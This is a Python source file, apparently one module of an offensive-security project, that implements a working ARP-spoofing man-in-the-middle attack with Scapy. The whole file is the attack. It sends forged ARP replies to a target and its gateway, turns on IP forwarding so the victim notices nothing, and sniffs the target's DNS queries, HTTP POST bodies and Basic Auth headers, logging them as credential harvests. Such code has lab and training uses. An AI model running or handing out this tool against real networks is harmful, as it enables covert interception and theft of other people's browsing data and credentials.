import time
import sys
import logging
import threading
import os
import json
import subprocess
from datetime import datetime

try:
    # Source 31: Networking: Scapy...
    from scapy.all import ARP, Ether, srp, sendp, sniff, wrpcap, DNS, DNSQR, IP, TCP, Raw
except ImportError:
    print("[!] Error: Scapy not installed. Run 'sudo apt install python3-scapy'")
    sys.exit(1)

# --- TELEMETRY SETUP ---
# FIX: Removed basicConfig to prevent global override
# FIX: Define a specific logger for ARP Spoofing
logger = logging.getLogger("ARP_MITM")

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = "eth0" # Default Kali interface, might need auto-detection
        self.running = False
        self.captured_creds = []

        print(f"[*] Initializing MITM Module (Target: {target_ip})...")
        
        # 1. Enable IP Forwarding (Critical for MITM)
        self.enable_ip_forwarding()

        # 2. Resolve MAC Addresses
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("[!] Critical Error: Could not resolve MAC addresses.")
            print("[!] Ensure Target is online and blocking ICMP/ARP isn't enabled.")
            sys.exit(1)
            
        print(f"[*] Resolved: Target={self.target_mac} | Gateway={self.gateway_mac}")

    def enable_ip_forwarding(self):
        """
        Enables packet forwarding so the victim doesn't lose internet.
        """
        try:
            if os.name == 'posix':
                # Linux method
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
                print("[+] IP Forwarding Enabled.")
        except Exception as e:
            print(f"[!] Warning: Could not enable IP Forwarding: {e}")
            print("[!] Victim might lose internet connectivity.")

    def get_mac(self, ip):
        """Resolves IP to MAC."""
        try:
            packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
            result = srp(packet, timeout=2, verbose=False, iface=self.interface)[0]
            return result[0][1].hwsrc
        except IndexError:
            return None

    def _log_event(self, event_type, details):
        """
        Writes JSON telemetry for the Log Analyzer (Source 52).
        """
        log_payload = {
            "event_type": event_type,
            "module": "[exploit] ARPSpoof",
            "target": self.target_ip,
            "data": details
        }
        # FIX: Use named logger
        logger.info(json.dumps(log_payload))

    def spoof_loop(self):
        """
        Sends forged ARP packets continuously.
        """
        try:
            packet_to_target = Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
            packet_to_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)

            while self.running:
                sendp(packet_to_target, verbose=False)
                sendp(packet_to_gateway, verbose=False)
                time.sleep(2)
        except Exception as e:
            print(f"[!] Spoof Thread Error: {e}")

    def packet_callback(self, packet):
        """
        Analyzes intercepted packets for interesting data (Source 119).
        """
        if not packet.haslayer(IP):
            return

        # 1. DNS Sniffing (Recon)
        if packet.haslayer(DNS) and packet.haslayer(DNSQR):
            try:
                query = packet[DNSQR].qname.decode('utf-8')
                print(f"[*] DNS LEAK: {self.target_ip} visited -> {query}")
                self._log_event("DNS_INTERCEPT", {"domain": query})
            except:
                pass

        # 2. HTTP Credential Sniffing (Post-Exploit)
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            try:
                payload = packet[Raw].load.decode('utf-8', errors='ignore')
                
                # Check for POST requests (Forms)
                if "POST" in payload and "HTTP" in payload:
                    print(f"\n[+] HTTP POST CAPTURED:\n{payload[:100]}...\n")
                    self._log_event("HTTP_POST", {"snippet": payload[:200]})

                # Check for Basic Auth (Base64 encoded creds)
                if "Authorization: Basic" in payload:
                    print(f"\n[!!!] BASIC AUTH CAPTURED:\n{payload}\n")
                    self._log_event("CREDENTIAL_HARVEST", {"raw_auth": payload, "risk": "CRITICAL"})

            except Exception:
                pass

    def sniff_loop(self):
        """
        Listens for traffic involving the target.
        """
        # Filter: Only packets coming from or going to the target
        bpf_filter = f"ip host {self.target_ip}"
        sniff(filter=bpf_filter, prn=self.packet_callback, store=False, stop_filter=lambda x: not self.running)

    def restore(self):
        print(f"\n[*] Restoring ARP Tables (Cleaning up)...")
        try:
            packet_restore_target = Ether(dst=self.target_mac) / ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            packet_restore_gateway = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
            
            sendp(packet_restore_target, count=4, verbose=False)
            sendp(packet_restore_gateway, count=4, verbose=False)
            
            # Disable IP Forwarding (Cleanup)
            if os.name == 'posix':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('0')
            
            print("[+] Network Restored. Logs saved to project_telemetry.log")
        except Exception as e:
            print(f"[!] Restoration Error: {e}")

    def run(self):
        print(f"[*] Starting ARP Spoof (MITM) + Sniffer...")
        print(f"[*] Logs are being written to 'project_telemetry.log' for SIEM Analysis.")
        print(f"[*] Press Ctrl+C to Stop.")
        
        self.running = True
        
        # Start Threads
        t_spoof = threading.Thread(target=self.spoof_loop)
        t_sniff = threading.Thread(target=self.sniff_loop)
        
        t_spoof.start()
        t_sniff.start()
        
        try:
            # Keep main thread alive
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            t_spoof.join()
            t_sniff.join(timeout=2)  # Ensure sniff thread terminates cleanly
            self.restore()

if __name__ == "__main__":
    # Test Mode
    if len(sys.argv) != 3:
        print("Usage: python3 arp_spoof.py <Target IP> <Gateway IP>")
    else:
        target = sys.argv[1]
        gateway = sys.argv[2]
        spoofer = ARPSpoofer(target, gateway)
        spoofer.run()